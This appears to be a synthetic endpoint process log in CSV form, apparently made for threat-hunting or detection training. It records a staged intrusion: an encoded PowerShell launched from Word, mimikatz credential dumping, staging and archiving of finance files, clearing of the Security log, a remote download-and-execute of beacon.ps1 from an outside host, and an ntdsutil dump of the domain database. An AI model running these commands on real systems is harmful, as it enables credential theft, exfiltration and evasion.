TimeGenerated,DeviceName,DeviceId,ActionType,FileName,FolderPath,ProcessCommandLine,SHA256,ProcessId,ProcessIntegrityLevel,AccountName,InitiatingProcessFileName,InitiatingProcessCommandLine,InitiatingProcessParentFileName,InitiatingProcessAccountName,InitiatingProcessAccountUpn,InitiatingProcessAccountSid,InitiatingProcessId,ReportId
2026-06-10T08:52:13Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,nltest.exe,C:\Windows\System32\,"""C:\Windows\System32\nltest.exe"" /dclist:contoso.com",c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0,7388,Medium,alexw,cmd.exe,"""C:\Windows\System32\cmd.exe"" /c whoami /all",powershell.exe,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,7256,200311
2026-06-10T08:54:58Z,DC01.contoso.com,b2b2b2b2-aaaa-bbbb-cccc-000000000001,ProcessCreated,taskhostw.exe,C:\Windows\System32\,taskhostw.exe {222A245B-E637-4AE9-A93F-A59CA119A75E},d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1,4472,Medium,itadmin,svchost.exe,C:\Windows\system32\svchost.exe -k netsvcs -p,services.exe,SYSTEM,,S-1-5-18,968,200312
2026-06-10T08:56:41Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,schtasks.exe,C:\Windows\System32\,"""C:\Windows\System32\schtasks.exe"" /create /tn ""WinUpdateSvc"" /tr ""C:\Users\alexw\AppData\Roaming\WinUpdate\svchost_helper.exe"" /sc onlogon /rl highest /f",e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2,7456,High,alexw,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",WINWORD.EXE,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,6240,200313
2026-06-10T08:58:27Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,cmd.exe,C:\Windows\System32,"""C:\Windows\System32\cmd.exe"" /c move %TEMP%\mimi_x64.exe %APPDATA%\WinUpdate\svchost_helper.exe",a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8,7512,Medium,alexw,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",WINWORD.EXE,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,6240,200314
2026-06-10T09:01:33Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,svchost_helper.exe,C:\Users\alexw\AppData\Roaming\WinUpdate\,"""C:\Users\alexw\AppData\Roaming\WinUpdate\svchost_helper.exe"" sekurlsa::minidump C:\Users\alexw\AppData\Local\Temp\lsass.dmp",d4f6b8a0c2e4f6b8a0c2e4f6b8a0c2e4f6b8a0c2e4f6b8a0c2e4f6b8a0c2e4f6,7604,High,alexw,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",WINWORD.EXE,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,6240,200315
2026-06-10T09:03:08Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,svchost_helper.exe,C:\Users\alexw\AppData\Roaming\WinUpdate\,"""C:\Users\alexw\AppData\Roaming\WinUpdate\svchost_helper.exe"" sekurlsa::logonpasswords",d4f6b8a0c2e4f6b8a0c2e4f6b8a0c2e4f6b8a0c2e4f6b8a0c2e4f6b8a0c2e4f6,7648,High,alexw,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",WINWORD.EXE,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,6240,200316
2026-06-10T09:05:21Z,HR-WS-03.contoso.com,c3c3c3c3-aaaa-bbbb-cccc-000000000003,ProcessCreated,OUTLOOK.EXE,C:\Program Files\Microsoft Office\root\Office16\,"""C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE""",b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c0,5440,Medium,jamest,explorer.exe,C:\Windows\Explorer.EXE,userinit.exe,jamest,jamest@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1162,5188,200317
2026-06-10T09:06:54Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,findstr.exe,C:\Windows\System32,"""C:\Windows\System32\findstr.exe"" /spin password C:\Users\alexw\Documents\Finance\*.xlsx",c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1,7712,Medium,alexw,cmd.exe,"""C:\Windows\System32\cmd.exe"" /c findstr /spin password C:\Users\alexw\Documents\Finance\*.xlsx",powershell.exe,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,7256,200318
2026-06-10T09:08:39Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,EXCEL.EXE,C:\Program Files\Microsoft Office\root\Office16\,"""C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE"" /dde",d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2,4960,Medium,alexw,explorer.exe,C:\Windows\Explorer.EXE,userinit.exe,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,3920,200319
2026-06-10T09:10:02Z,DC01.contoso.com,b2b2b2b2-aaaa-bbbb-cccc-000000000001,ProcessCreated,gpupdate.exe,C:\Windows\System32,"""C:\Windows\System32\gpupdate.exe"" /force",e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3,4612,High,itadmin,cmd.exe,"""C:\Windows\System32\cmd.exe""",explorer.exe,itadmin,itadmin@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1009,4520,200320
2026-06-10T09:11:48Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,cmd.exe,C:\Windows\System32,"""C:\Windows\System32\cmd.exe"" /c mkdir %TEMP%\staging",a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8,7780,Medium,alexw,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",WINWORD.EXE,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,6240,200321
2026-06-10T09:12:31Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,robocopy.exe,C:\Windows\System32,"""C:\Windows\System32\robocopy.exe"" C:\Users\alexw\Documents\Finance C:\Users\alexw\AppData\Local\Temp\staging *.xlsx *.docx /S",b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c1,7824,Medium,alexw,cmd.exe,"""C:\Windows\System32\cmd.exe"" /c robocopy C:\Users\alexw\Documents\Finance %TEMP%\staging *.xlsx *.docx /S",powershell.exe,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,7780,200322
2026-06-10T09:13:55Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,7z.exe,C:\Program Files\7-Zip\,"""C:\Program Files\7-Zip\7z.exe"" a -tzip -pInf!ltr8 C:\Users\alexw\AppData\Local\Temp\finance_archive_0610.zip C:\Users\alexw\AppData\Local\Temp\staging\*",a7b9d1f3e5c7a9b1d3f5e7c9a1b3d5f7e9c1a3b5d7f9e1c3a5b7d9f1e3c5a7b9,7902,Medium,alexw,cmd.exe,"""C:\Windows\System32\cmd.exe"" /c ""C:\Program Files\7-Zip\7z.exe"" a -tzip -pInf!ltr8 %TEMP%\finance_archive_0610.zip %TEMP%\staging\*",powershell.exe,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,7780,200323
2026-06-10T09:15:12Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,cmd.exe,C:\Windows\System32,"""C:\Windows\System32\cmd.exe"" /c move %TEMP%\finance_archive_0610.zip %APPDATA%\WinUpdate\update_0610.dat",a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8,7968,Medium,alexw,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",WINWORD.EXE,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,6240,200324
2026-06-10T09:16:40Z,HR-WS-03.contoso.com,c3c3c3c3-aaaa-bbbb-cccc-000000000003,ProcessCreated,Teams.exe,C:\Users\jamest\AppData\Local\Microsoft\Teams\current\,"""C:\Users\jamest\AppData\Local\Microsoft\Teams\current\Teams.exe""",c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d2,5588,Medium,jamest,Update.exe,"""C:\Users\jamest\AppData\Local\Microsoft\Teams\Update.exe"" --processStart Teams.exe",explorer.exe,jamest,jamest@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1162,5512,200325
2026-06-10T09:18:24Z,DC01.contoso.com,b2b2b2b2-aaaa-bbbb-cccc-000000000001,ProcessCreated,lsass.exe,C:\Windows\System32\,C:\Windows\system32\lsass.exe,d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e2,712,System,SYSTEM,wininit.exe,wininit.exe,smss.exe,SYSTEM,,S-1-5-18,624,200326
2026-06-10T09:19:57Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,wevtutil.exe,C:\Windows\System32,"""C:\Windows\System32\wevtutil.exe"" cl Security",e2f3a4b5c6d7e8f9a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f4,8024,High,alexw,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -ep bypass -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0A...",WINWORD.EXE,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,6240,200327
2026-06-10T09:21:39Z,FIN-WS-07.contoso.com,d1d1d1d1-aaaa-bbbb-cccc-000000000007,ProcessCreated,powershell.exe,C:\Windows\System32\WindowsPowerShell\v1.0\,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://badupdate-cdn.com/a/beacon.ps1')",c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d5,8088,Medium,alexw,svchost_helper.exe,"""C:\Users\alexw\AppData\Roaming\WinUpdate\svchost_helper.exe""",powershell.exe,alexw,alexw@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1107,7648,200328
2026-06-10T09:23:02Z,HR-WS-03.contoso.com,c3c3c3c3-aaaa-bbbb-cccc-000000000003,ProcessCreated,OneDrive.exe,C:\Users\meganb\AppData\Local\Microsoft\OneDrive\,"""C:\Users\meganb\AppData\Local\Microsoft\OneDrive\OneDrive.exe"" /background",f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3d4e5f6a8,5640,Medium,meganb,explorer.exe,C:\Windows\Explorer.EXE,userinit.exe,meganb,meganb@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1153,5012,200329
2026-06-10T09:24:48Z,DC01.contoso.com,b2b2b2b2-aaaa-bbbb-cccc-000000000001,ProcessCreated,ntdsutil.exe,C:\Windows\System32\,"""C:\Windows\System32\ntdsutil.exe"" ""ac i ntds"" ""ifm"" ""create full C:\Windows\Temp\ifm"" q q",a0b1c2d3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1,5012,System,itadmin,powershell.exe,"""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe""",cmd.exe,itadmin,itadmin@contoso.com,S-1-5-21-1112223334-4445556667-7778889990-1009,4880,200330
